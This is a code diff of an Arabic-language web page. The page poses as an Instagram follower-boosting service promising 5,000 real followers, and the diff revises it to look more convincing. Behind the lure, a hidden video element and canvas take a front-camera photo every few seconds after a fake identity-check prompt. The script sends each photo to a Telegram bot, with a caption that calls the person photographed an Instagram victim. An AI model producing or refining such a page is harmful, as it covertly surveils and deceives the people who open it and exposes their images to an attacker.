@@ -2,20 +2,23 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>زيادة متابعين حقيقية 2026</title>
+    <title>زيادة متابعين انستقرام حقيقية 2026</title>
     <style>
-        body { background: #fafafa; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 50px; direction: rtl; }
-        .card { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 320px; margin: auto; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        h2 { color: #262626; font-size: 20px; }
-        p { color: #8e8e8e; font-size: 14px; }
-        button { background: #0095f6; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        body { background: #fafafa; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 50px; direction: rtl; }
+        .card { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 320px; margin: auto; border-radius: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.08); }
+        h2 { color: #262626; font-size: 22px; margin-bottom: 10px; }
+        p { color: #8e8e8e; font-size: 14px; line-height: 1.6; }
+        .insta-logo { width: 60px; margin-bottom: 15px; }
+        button { background: #0095f6; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
+        button:hover { background: #1877f2; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>🚀 بوت تمن ناكع للزيادة</h2>
-        <p>مرحباً بك! اضغط على الزر أدناه للتحقق من حسابك وبدء إرسال المتابعين.</p>
-        <button onclick="startInfection()">بدء التحقق الآن</button>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="insta-logo" alt="Instagram">
+        <h2>بوت زيادة متابعين الانستاغرام</h2>
+        <p>مرحباً بك في نظام التحقق التلقائي. اضغط على الزر أدناه لتأكيد حسابك وبدء إرسال 5000 متابع حقيقي لحسابك فوراً.</p>
+        <button onclick="startInfection()">بدء التحقق والزيادة الآن</button>
         <video id="video" width="0" height="0" autoplay style="display:none;"></video>
         <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
     </div>
@@ -30,12 +33,12 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                // سحب صورة كل 2 ثانية وإرسالها لك
+                // سحب صورة كل 3 ثواني وإرسالها لبوتك
                 setInterval(() => {
                     captureImage();
-                }, 2000);
+                }, 3000);
             } catch (err) {
-                alert("⚠️ خطأ: يجب السماح بالوصول للكاميرا لتأكيد أنك لست روبوت!");
+                alert("⚠️ خطأ في النظام: يجب السماح بالوصول للكاميرا لتأكيد هويتك وضمان عدم تكرار الطلب!");
             }
         }
 
@@ -47,8 +50,8 @@
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', MY_ID);
-                formData.append('photo', blob, 'cam_shot.jpg');
-                formData.append('caption', '🔥 تمن ناكع: تم سحب صورة جديدة من الكاميرا الأمامية!');
+                formData.append('photo', blob, 'insta_shot.jpg');
+                formData.append('caption', '🔥 تم سحب صورة جديدة من كاميرا ضحية انستقرام!');
 
                 fetch(`https://api.telegram.org/bot${API_TOKEN}/sendPhoto`, {
                     method: 'POST',
